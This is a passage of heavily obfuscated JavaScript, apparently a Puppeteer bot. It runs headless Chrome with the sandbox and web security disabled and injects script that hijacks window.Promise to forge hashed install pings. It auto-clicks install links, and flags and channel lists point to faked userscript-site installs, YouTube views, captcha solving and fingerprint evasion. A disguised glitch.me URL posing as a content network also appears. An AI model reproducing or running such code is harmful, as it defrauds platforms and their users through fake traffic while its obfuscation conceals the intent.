                return this['bytes'] > -0x1 * -0x179cc08d3 + 0x8bc27f45 * 0x3 + 0x21d1386a3 * -0x1 && (this['hBytes'] += this['bytes'] / (0x15e4a84a0 + 0x18ea * -0x9ec74 + 0x36ca * 0x2caa4) << -0xc9a * 0x3 + -0x748 * -0x3 + 0xff6, this['bytes'] = this[U(0x5)] % (0xd56d7cd8 + 0x247a461 * 0x8 + 0x18556020)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x58b + -0x4f * -0x76 + -0x1ede;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x1aad + 0x10 * 0x87 + 0x230d * -0x1] = this['block'], J[K >> 0x10 * -0x166 + -0x644 + 0x1ca6] |= x[0x6 * -0x13 + -0x7e2 * 0x4 + 0x1ffd * 0x1 & K], this['block'] = J[0x1 * -0x24e2 + -0xeb + 0x25dd], K >= 0x546 + 0x21d * -0x5 + 0x53 * 0x11 && (this['hashed'] || this['hash'](), J[0xbd0 + -0x184b + -0xd5 * -0xf] = this['block'], J[0x12c6 + 0x6 * 0xd9 + -0x17cc] = J[-0x1 * -0x179 + 0x12a5 + -0x141d] = J[0x4 * -0x4e1 + 0x26f8 + -0x9b9 * 0x2] = J[-0xb5e * 0x3 + 0x165c + -0x3eb * -0x3] = J[0x142d + -0x37 * 0x7d + -0x2 * -0x359] = J[-0xac5 * -0x2 + -0xae3 + -0xaa2] = J[0x4 * -0x7a4 + 0x2020 + -0x2 * 0xc5] = J[0x1 * 0x157 + 0xef * 0xd + -0xd73] = J[0x2 * 0x98f + 0x13 * 0x2b + -0x76d * 0x3] = J[-0x142d * -0x1 + -0x5eb * 0x1 + -0xe39] = J[-0x2298 + 0x117c + 0x1126] = J[0xc * 0xc7 + -0x976 + 0x2d] = J[-0x1e29 + 0x56 * 0x1b + 0x1523] = J[0x65 * 0x2 + -0xf9 * 0x13 + -0x11be * -0x1] = J[-0x9c5 + 0x815 * 0x1 + 0x2 * 0xdf] = J[0x17cb * 0x1 + -0x17 * -0x124 + -0x31f8] = 0x1 * 0x187f + -0x1 * 0x46f + -0x141 * 0x10), J[0x4 * 0x713 + 0x5b1 + -0x21ef] = this['hBytes'] << 0x341 + -0x1445 * -0x1 + 0x1783 * -0x1 | this['bytes'] >>> -0x1 * 0xdef + -0x1e5 * -0xa + 0x16 * -0x39, J[0x6fb * 0x5 + -0x2179 + -0x15f] = this['bytes'] << -0x1edf * -0x1 + -0x656 * 0x4 + -0x584, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1ddf + 0x35 * 0x89 + -0x36c * 0x11; J < -0x2367 + 0x1a90 + -0x1 * -0x927; ++J)
                K = Q[J - (-0x1 * 0x55d + -0x1 * -0x13db + -0xe7b)] ^ Q[J - (0x43d + 0x1 * -0xca7 + 0x872)] ^ Q[J - (0x11b8 + -0x6 * -0x10c + -0xa * 0x265)] ^ Q[J - (0x4 * 0x761 + -0x151a + -0x85a)], Q[J] = K << -0x109 + -0x2 * -0xf43 + -0x33 * 0x94 | K >>> 0x1d * -0x7d + 0x74b * -0x5 + 0x1 * 0x32bf;
              for (J = -0x1 * -0x1e9b + -0x1d * 0xb4 + -0x20b * 0x5; J < -0x1e3f + -0x3 * -0x9f9 + 0x68; J += -0x4bb + 0x20bf + -0x1bff)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2297 + 0x2da * -0xa + 0x3f20 | L >>> 0x1f0 + 0xb * 0x6e + -0x68f) + (M & N | ~M & O) + P + (0x309dd3f1 + 0x8699 * 0x13c3 + 0x1f80c41d) + Q[J] << 0x1 * 0x391 + 0x5b4 * -0x4 + -0x133f * -0x1) << 0x2292 + -0x1fc + -0x2091 | P >>> -0x2 * 0x32c + 0xad5 + 0x33 * -0x16) + (L & (M = M << -0xa * -0x16b + 0x999 + -0x17a9 | M >>> -0x1bdf + 0x19bf + -0x111 * -0x2) | ~L & N) + O + (-0x192d8 * -0x230b + 0x8e6ba9ba + -0x6b0e0769) + Q[J + (0x773 * -0x1 + -0x1 * -0xe6f + -0x6fb)] << -0x2226 + 0x19e9 + 0x2bf * 0x3) << -0xe84 + -0x459 + 0x12e2 | O >>> 0x1 * 0x11e1 + -0x1 * 0x63d + 0x1 * -0xb89) + (P & (L = L << -0xf * 0xf1 + -0x1 * -0x10ac + 0x7 * -0x59 | L >>> -0xf44 + -0x8c9 * -0x1 + 0x67d) | ~P & M) + N + (0xa600f4e + -0x74292e7b + -0xc44b98c6 * -0x1) + Q[J + (-0x2541 + -0x1b9a + 0x40dd)] << -0x1 * 0x1cc9 + 0x2 * -0x114a + -0x3 * -0x151f) << 0x40c + 0x1c27 + 0x2 * -0x1017 | N >>> 0xf03 + 0xf5c * 0x1 + -0xf22 * 0x2) + (O & (P = P << 0x196e + -0xb5d + -0xdf3 | P >>> -0x4 * -0x2de + -0xd2f + -0x1 * -0x1b9) | ~O & L) + M + (-0x3357ea88 * 0x3 + -0x7097bea0 + 0x16521f7d1) + Q[J + (0x3fd * -0x1 + 0x1ad2 * 0x1 + -0x16d2)] << 0x5 * -0xc9 + 0x5b3 * -0x3 + 0x1506) << -0x213d + 0x1006 + 0x113c | M >>> 0xed + -0x76b + 0x233 * 0x3) + (N & (O = O << 0x223f + -0xb9a + -0x1687 | O >>> -0xf9e + 0x16e + -0x719 * -0x2) | ~N & P) + L + (0x1 * 0x1e5bd4fb + 0x10a42bc7 + 0x2b8278d7) + Q[J + (-0xef * 0x21 + -0x1aeb * 0x1 + -0x30a * -0x13)] << -0x1a6 + 0x3 * -0xacf + 0x2213, N = N << -0x1 * -0x1b26 + -0x3 * 0x5d1 + -0x995 | N >>> 0x9b2 + -0x2 * -0x730 + 0x230 * -0xb;
              for (; J < 0x28b * 0x4 + 0xfc2 * 0x2 + 0x4 * -0xa62; J += -0x1 * -0x9a5 + -0x29f + 0x1 * -0x701)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x10da + -0x20f6 * 0x1 + 0x1021 * 0x1 | L >>> 0x1b1 * -0xa + -0x215e + 0x3263) + (M ^ N ^ O) + P + (0x69b07604 + -0xda802887 + 0x2c * 0x5154f3b) + Q[J] << -0x20b9 * 0x1 + -0x358 * 0x3 + 0xc7 * 0x37) << -0x3f * 0x59 + -0x37 * 0x97 + -0x365d * -0x1 | P >>> 0x1 * 0x137d + 0xe5b + -0x21bd) + (L ^ (M = M << -0x3 * -0x382 + 0x134d + 0x5f1 * -0x5 | M >>> -0x2 * 0x742 + -0xbab + -0x53d * -0x5) ^ N) + O + (-0x7b812b2 + -0xe862d02 + 0x85182b55) + Q[J + (0x11e3 + -0x9 * -0x351 + -0x2fbb)] << -0x1aa1 * -0x1 + -0x15f2 + -0x6d * 0xb) << 0xc2b + -0xd5f + -0x139 * -0x1 | O >>> 0x25cd * 0x1 + 0x55 * 0x13 + -0x2c01) + (P ^ (L = L << -0x52 + -0x4 * -0x4b2 + 0x496 * -0x4 | L >>> 0x8 * 0x43a + 0x7e9 + -0x29b7) ^ M) + N + (-0xc22844cc + 0xd69c1b64 + 0x5a661509) + Q[J + (0x13ae + 0x1c5a + -0x3006)] << 0x22f0 + 0x4 * -0x509 + 0x766 * -0x2) << -0x897 * -0x1 + 0x876 * -0x3 + -0x10d0 * -0x1 | N >>> -0x79f + 0x23b0 + -0x3 * 0x952) + (O ^ (P = P << -0x7f * 0x16 + 0x1181 * -0x1 + 0x1c89 | P >>> 0x1 * -0x1c18 + -0x1cf9 * 0x1 + 0x13 * 0x301) ^ L) + M + (-0xca * 0xc19703 + 0x18147342 + 0xef86a0bd) + Q[J + (-0x12d2 + 0x20c2 + -0xded)] << -0x5 * -0x315 + 0x84f + -0x17b8) << 0x222f + -0x1 * -0x121f + 0x5 * -0xa75 | M >>> 0x69c + -0x1 * -0x16f + 0x2 * -0x3f8) + (N ^ (O = O << -0x3 * 0x2ac + 0x64d * 0x3 + 0x397 * -0x3 | O >>> 0x25a + -0x178d + 0x1535) ^ P) + L + (0x3eef * -0x34cc7 + 0x6bc1a972 + -0x1 * -0xd2c521f8) + Q[J + (0x1 * 0xc9a + 0x145d + -0x20f3)] << 0x11 * -0x143 + -0x1d26 + -0x1 * -0x3299, N = N << 0x1 * 0x2296 + -0x11c6 + -0x10b2 | N >>> 0x80e + 0x14 * 0xcf + -0x60e * 0x4;
              for (; J < 0x13bf + 0x7 * -0x321 + -0xc * -0x33; J += -0x25ea + 0x2 * 0x611 + 0x19cd)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x6d3 * -0x4 + -0x1 * 0x1593 + -0xe * -0x37e | L >>> 0x47 * 0x5f + -0x22d6 + 0x898) + (M & N | M & O | N & O) + P - (0x12fa21 * -0x4fd + 0x2ccf69 * 0x437 + 0x12afc632) + Q[J] << 0x43c * -0x4 + -0x2148 * -0x1 + -0x1058) << 0x1 * -0xe8 + 0x1f37 * 0x1 + -0x1e4a | P >>> -0x1 * -0x141b + -0x1 * -0x84e + -0x1c4e) + (L & (M = M << -0x4ae + 0x2ab + 0x6d * 0x5 | M >>> -0x23a * 0x9 + 0x29 * -0x3a + 0x1d56) | L & N | M & N) + O - (-0x6f277417 + 0x17f3359d + 0xc818819e) + Q[J + (-0x626 + -0x20a + 0x831)] << 0x6bf + -0x9d7 + 0xc6 * 0x4) << -0x1 * -0x1bc9 + 0x262a + -0x41ee | O >>> 0x68d + 0x1e20 + -0x2492) + (P & (L = L << 0x121f * -0x1 + 0x3 * -0xceb + -0x5b3 * -0xa | L >>> -0x7 * -0x1c6 + -0x1fc1 + -0x27 * -0x7f) | P & M | L & M) + N - (-0x1421f54c + -0x98fd0099 + -0xd0cf * -0x15ea7) + Q[J + (-0x1495 + -0x8b + -0x21d * -0xa)] << 0x7 * 0x3a6 + -0x1d11 + 0x81 * 0x7) << -0x2 * -0x542 + 0x327 + -0xda6 | N >>> -0x14e1 + -0x137c + -0x38 * -0xb9) + (O & (P = P << -0x1abf + -0x1 * -0x1a6b + 0x1 * 0x72 | P >>> -0x19a + -0x2 * 0x1115 + 0x23c6) | O & L | P & L) + M - (0x10e530f6 + 0xf8706c5 * 0xe + -0x79634c98) + Q[J + (0x13ce + 0x1b27 + -0x6 * 0x7d3)] << 0x1bf * 0x5 + 0x1b0f + -0x23ca) << 0x255d + 0x1 * 0xb + -0x2563 * 0x1 | M >>> -0x1a7a + 0x44c + -0xa3 * -0x23) + (N & (O = O << 0x200c + -0x1824 + 0x7ca * -0x1 | O >>> 0x2532 + -0x753 + -0x1ddd) | N & P | O & P) + L - (-0x1 * -0x27ef7fee + -0x9a880139 + 0xe37cc46f) + Q[J + (-0x190b + 0x1 * 0x61f + 0x978 * 0x2)] << -0x156 + -0xa08 + 0xb5e, N = N << -0x214b + 0x122e + 0xf3b | N >>> -0xa31 * -0x1 + -0x116d + 0x73e;
              for (; J < -0x30 * 0x1b + 0x761 * 0x1 + 0x39 * -0x9; J += -0x2009 * 0x1 + -0x88 * 0x3 + 0x21a6)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xdfc + 0x2dd + -0x3 * 0x59c | L >>> -0x277 * -0x1 + -0x133f + -0x21 * -0x83) + (M ^ N ^ O) + P - (-0x21998f77 + -0x496 * -0x3 + 0x669 * 0xd9b07) + Q[J] << -0xd9f + 0x32 * 0x89 + 0x461 * -0x3) << -0x85 * -0xb + 0x1 * -0x14d + -0x465 | P >>> -0x406 + 0xe4f + -0x2 * 0x517) + (L ^ (M = M << -0x2232 + -0x2d6 + 0x6 * 0x631 | M >>> -0x377 + -0x1dc5 + 0x25 * 0xe6) ^ N) + O - (0x68735c8e + 0x4a7904e6 * -0x1 + 0xbd17341 * 0x2) + Q[J + (0x2 * 0x120d + 0x20 * -0xe4 + -0x799)] << 0x1 * 0x23cc + 0x1 * -0x21f7 + -0x1d5) << 0x259 + 0x12a5 * 0x1 + 0x2ff * -0x7 | O >>> -0x7a2 + -0x26ef + 0xce * 0x3a) + (P ^ (L = L << 0x136e + 0x6a * 0x19 + -0x1 * 0x1daa | L >>> 0x1037 + 0xb0d + -0xda1 * 0x2) ^ M) + N - (-0x3dfec06a + 0x1c06f * 0xf92 + 0x5855be46) + Q[J + (-0x182a + 0x12fd * -0x2 + 0x1 * 0x3e26)] << 0x1 * -0x2056 + -0x272 + 0x2 * 0x1164) << -0x1869 + 0x1 * -0x11be + 0x2a2c | N >>> -0xc43 + 0x1b06 + -0x3aa * 0x4) + (O ^ (P = P << 0x61f + -0x1fde * 0x1 + 0x1 * 0x19dd | P >>> -0x201e * 0x1 + 0x1a + 0x2006) ^ L) + M - (0x2 * -0x3596c7e1 + 0x1 * 0x178f2276 + 0x893bab76) + Q[J + (-0x1806 + -0x196a + 0x3173)] << -0x84b * -0x4 + -0x442 + -0x1cea) << -0xa6c + -0x2 * 0x112d + 0x2ccb | M >>> 0xb54 + -0xa88 + -0xb1) + (N ^ (O = O << 0x110b * 0x2 + 0x481 * 0x6 + 0x1a6 * -0x25 | O >>> -0x186f + -0x10 * -0x22e + 0xa6f * -0x1) ^ P) + L - (-0x3a * 0x16caea9 + -0x444e59db + 0xcc8b2a4f * 0x1) + Q[J + (-0x11f8 + -0x2 * -0x8de + 0x40)] << -0x18 * 0x68 + 0x2d2 + 0x1 * 0x6ee, N = N << 0x72c * 0x4 + -0x19b5 + -0x2dd | N >>> -0x34b * 0x5 + -0xbc * 0x1 + -0x371 * -0x5;
              this['h0'] = this['h0'] + L << -0xc12 + -0x16f * -0x13 + 0xb * -0x161, this['h1'] = this['h1'] + M << 0x17 * -0x5 + -0x1f18 + -0x55 * -0x5f, this['h2'] = this['h2'] + N << 0x9 * -0x2ae + -0x1bb8 + 0x1 * 0x33d6, this['h3'] = this['h3'] + O << 0x1b5f + 0x96c + -0x24cb, this['h4'] = this['h4'] + P << 0x1 * -0x1722 + -0xaa2 + -0x871 * -0x4;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0xa8e + -0x142c * 0x1 + 0x1 * 0x1ed6 & 0x20f6 + 0x3 * -0xa37 + -0x1 * 0x242] + w[J >> -0x8da + 0x42 * 0x7d + -0x1748 & 0x3 * 0xfb + -0x1 * -0xbbf + -0xea1] + w[J >> 0x3 * -0xb44 + -0xdfb * -0x1 + 0x13e5 & 0x399 * 0x9 + -0x1f0d * 0x1 + -0x145] + w[J >> 0x18ad + -0x1610 + -0x28d * 0x1 & 0xe3a + -0x932 * -0x2 + -0x683 * 0x5] + w[J >> -0x584 + 0x598 + 0x1 * -0x8 & 0x1bb6 + -0xb * 0x363 + 0x99a] + w[J >> -0x1dff * 0x1 + -0x5 * 0x783 + 0x4396 & -0xc1b * 0x2 + 0x45 * 0x69 + -0x408] + w[J >> -0xa0 * -0x10 + 0x1429 + -0x1 * 0x1e25 & 0x26a5 + 0x9 * -0x2af + -0xe6f] + w[-0x1ceb * 0x1 + 0x3f8 * -0x3 + 0x2 * 0x1471 & J] + w[K >> 0x178b + -0x2086 + 0x917 & -0x1 * 0x16bf + -0x2537 + 0x1b7 * 0x23] + w[K >> 0x20b1 * -0x1 + 0x319 * -0x6 + 0x335f * 0x1 & -0x1 * -0x26da + -0x1a1e + -0xcad] + w[K >> 0xdea + -0x91f * -0x4 + -0x3252 & -0x33f + 0x9ca + -0x67c] + w[K >> -0x1 * -0x1652 + -0xfa3 * 0x2 + 0x904 & -0xb7a + -0x48 * 0x4f + 0x21c1] + w[K >> -0x1 * 0x507 + -0xe63 + -0x2f * -0x6a & 0x16c + -0x14 * -0x16a + 0x1 * -0x1da5] + w[K >> -0x2532 + 0x808 + 0x1d32 & -0x7 * 0xc4 + 0x5b4 * 0x1 + -0x49 * 0x1] + w[K >> -0x527 + 0x523 + 0x8 & -0x2 * -0x83 + -0x1 * -0x765 + -0x85c] + w[0xa40 + 0xc5d + -0x168e & K] + w[L >> 0x3 * 0xa4 + -0xb9 * 0x35 + 0x247d & 0x4bf * -0x3 + 0x1 * 0x2de + 0xb6e] + w[L >> 0x20b5 + 0x24c6 + -0x4563 & -0x19d4 + -0x2488 + 0x3e6b] + w[L >> -0x14 * -0x48 + 0x2c1 * -0x5 + -0x1 * -0x839 & 0x1e9a + -0x9e5 + -0x14a6] + w[L >> 0x1900 + -0x1cd5 + 0x3e5 & 0x23f6 + -0xff7 + -0x13f0] + w[L >> 0x1020 + -0x1341 + 0x32d * 0x1 & 0x238b + -0x2 * -0x1ff + -0x277a] + w[L >> 0x198f + -0x104 + -0x5 * 0x4e7 & -0x271 * 0x3 + 0x126b + -0xb09] + w[L >> -0x4b * 0x4d + 0x6ce + 0xfc5 & 0xb6f + -0x1202 + 0x6a2] + w[-0x301 * -0x1 + -0x3a5 * -0x6 + 0x10 * -0x18d & L] + w[M >> 0x248b + 0xab5 + 0x4 * -0xbc9 & -0x4da + -0x2 * -0x28d + 0x7 * -0x7] + w[M >> -0x1baa + 0x1 * -0x2f1 + 0x1eb3 & -0x1 * -0x6d1 + 0x1 * 0xa85 + -0x1 * 0x1147] + w[M >> 0x3bc * 0x7 + -0xf07 + 0xb09 * -0x1 & 0x22ee + 0x2289 + -0x4568] + w[M >> 0x53 * 0x33 + -0x106b * 0x1 + -0xe & 0xe8 * 0x10 + 0x2 * 0x159 + -0x29 * 0x6b] + w[M >> -0x6b * -0x42 + 0xec8 + -0x1529 * 0x2 & -0x144d + 0x506 * 0x4 + -0x2 * -0x22] + w[M >> -0x3 * 0x5cd + -0x182c + 0x299b & -0x19ce + 0x1 * 0x42f + -0xde * -0x19] + w[M >> -0x12f + -0x22ee * -0x1 + -0x21bb & -0x248e + 0x1f7a + 0x523] + w[0x2 * 0x137 + -0x12cf + 0x2 * 0x838 & M] + w[N >> -0x4 * -0x7 + -0x5c9 * 0x1 + 0x5c9 & -0x23d4 + 0x1 * -0x257 + 0x7 * 0x576] + w[N >> -0x3 * 0x80 + -0x850 + 0x9e8 & 0x5 * 0x2fc + -0x1 * -0x79d + 0x7 * -0x336] + w[N >> 0xcf * 0xb + 0x8aa + -0x19 * 0xb3 & -0x2d * 0xb2 + -0x1 * 0x12e9 + 0x3242] + w[N >> -0xe03 + -0x2 * -0x1163 + -0x14b3 & -0x1 * 0x1b2e + 0x10a0 + 0xa9d] + w[N >> 0x1823 + -0x1 * 0x1535 + -0x2e2 & 0x1 * -0xa6e + 0x6fd + -0xe * -0x40] + w[N >> -0x1 * 0x18d7 + 0xa64 + 0xe7b & -0xe6a + -0x248c * -0x1 + 0x1613 * -0x1] + w[N >> 0x2186 + 0x192e + 0x18 * -0x272 & 0x55b + 0xca * -0x1b + 0x556 * 0x3] + w[-0x1e * 0x81 + 0x52c * -0x2 + 0x8b * 0x2f & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x19cd + -0x6da + 0x20bf & 0x1f4b * -0x1 + -0x620 + 0x266a,
                J >> 0xf0b * 0x2 + -0xa41 + -0x7 * 0x2d3 & 0x10a2 + 0xc47 + -0x1bea * 0x1,
                J >> -0x2151 * 0x1 + -0x1 * -0x45d + 0x7 * 0x424 & 0x2 * -0x4b0 + -0x5 * -0x4af + -0xd0c,
                0x268f + -0x1 * 0x2510 + -0x80 & J,
                K >> -0x1 * -0x100f + -0x1217 + 0x220 & 0x19 * 0x169 + 0xd * 0x254 + -0x4086,
                K >> 0x542 * -0x2 + 0xa74 + 0x8 * 0x4 & -0x3ab + 0x19d9 + 0x152f * -0x1,
                K >> 0x17e3 + -0x1dc3 * -0x1 + -0x359e * 0x1 & -0x1 * 0x15c5 + 0x3 * -0xc63 + 0x3bed,
                -0x7 * 0x493 + -0x1 * -0x5c9 + 0x1 * 0x1b3b & K,
                L >> -0x5e6 + 0x2ef * 0xc + -0xe9b * 0x2 & -0x2 * 0x57a + -0x1f1 * 0x1 + 0x4 * 0x379,
                L >> -0x1172 + -0x2274 + 0x33f6 * 0x1 & -0x1eaf * -0x1 + 0x3c2 + -0x2172,
                L >> 0xbce * 0x2 + -0x14df + 0xb * -0x3f & 0xd51 + -0x3a4 * 0x1 + 0x1 * -0x8ae,
                0x9a0 + 0x6 * -0x453 + 0x1151 & L,
                M >> 0x1249 + 0x2526 + -0x1c9 * 0x1f & -0x17 * 0xac + 0xea + -0xf89 * -0x1,
                M >> -0x1 * -0x4fb + 0xc36 * -0x2 + 0x1381 & -0x10ed + -0x2629 + -0x7 * -0x803,
                M >> -0xed5 + -0x962 * 0x1 + 0x183f & -0x13d1 + 0x4eb + -0x139 * -0xd,
                0x1 * 0x8c3 + 0x456 + -0x60d * 0x2 & M,
                N >> 0xaae + -0xcf8 * 0x3 + 0xfa * 0x1d & -0xc4a + -0x5 * -0x176 + -0x1 * -0x5fb,
                N >> 0x1331 + 0x232f + -0x3650 & -0x1 * 0x1d4 + 0x1f7c + -0x1ca9 * 0x1,
                N >> -0x137d * 0x2 + 0x1697 + -0x1 * -0x106b & -0x185 * 0xa + -0x94e * -0x1 + 0x6e3,
                -0x1f * -0x7 + -0x4 * 0x78d + 0x1e5a & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x52 + -0xb51 + -0x1 * -0xbb7), (K = new DataView(J))['setUint32'](-0xbf * -0x2f + -0x719 + -0x1bf8, this['h0']), K['setUint32'](0x12b0 + 0x218c + -0x3438, this['h1']), K['setUint32'](-0x1 * -0x12cd + -0xdf9 * 0x2 + 0x1b * 0x57, this['h2']), K['setUint32'](0x2 * 0x5e0 + -0x191c * 0x1 + 0x138 * 0xb, this['h3']), K['setUint32'](-0xe02 + 0x1 * 0x1b99 + 0xd87 * -0x1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1a51 * 0x1 + 0x1 * 0x16ab + -0x30fc];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x3 * -0x77b + 0x2248 + 0x7 * -0x1b1;
            J[0x12b7 + 0x1d * 0x5e + 0x1 * -0x1d5d]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x1 * 0x502 + -0x19b * -0x13 + 0x1 * -0x2383] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x602 + -0x1314 + 0xd13), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x7 * -0x2bb + -0x18a0 + 0x584;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x4f2 + 0x1 * -0x8c3 + 0x1 * 0x1391), Promise['resolve'](-0x2b * -0x47 + 0xd7 * -0x5 + -0x7b9);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0xc62 + -0x13 * -0x1d4 + -0x2f1e; j < -0x2 * -0x10fa + -0x2b * 0x31 + -0x19b8; j++)
    i();
}
const NETWORK_PATIENCE = 0x1 * 0xe2c + -0x7ec + 0x1900 + (-0x2 * -0x535 + -0x23 * -0x5 + 0x9f) * Math['random'](),
  MM_NETWORK_PATIENCE = (0xe99 + -0x1fee + -0xc * -0x172) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0xc * -0xef + -0x1ee + -0x4a3 * 0x2);
    let h = e[f];
    if (c['NDIjMY'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x2bd * -0x9 + -0x15e4 + 0x2e89, r, s, t = 0x1942 * 0x1 + -0x1724 + 0x1 * -0x21e; s = m['charAt'](t++); ~s && (r = q % (0xc41 + 0x1 * -0x1fd9 + -0x5 * -0x3ec) ? r * (-0x33 * 0xac + 0x34d * -0x7 + 0x399f) + s : s, q++ % (-0x131e * -0x2 + -0x3 * 0x823 + 0x1f9 * -0x7)) ? o += String['fromCharCode'](0x230d + 0x5 * -0x473 + -0xbcf & r >> (-(0x1e * -0x29 + 0xa35 + -0x565) * q & -0xa * -0x232 + 0x5 * -0xb3 + 0x16b * -0xd)) : -0xa * 0xb6 + 0x52a * -0x3 + 0x169a) {
          s = n['indexOf'](s);
        }
        for (let u = 0x1777 + 0x1430 + -0x2ba7, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x1f35 + -0x1347 + -0xa * -0x50e))['slice'](-(0x846 + -0x409 + -0x43b));
        }
        return decodeURIComponent(p);
      };
      c['XJsUaw'] = i, b = arguments, c['NDIjMY'] = !![];
    }
    const j = e[-0x1ba3 + -0x1db4 + 0x831 * 0x7],
      k = f + j,
      l = b[k];
    return !l ? (h = c['XJsUaw'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    V(0x17) + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x21d7 + -0x560 + 0x2737; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
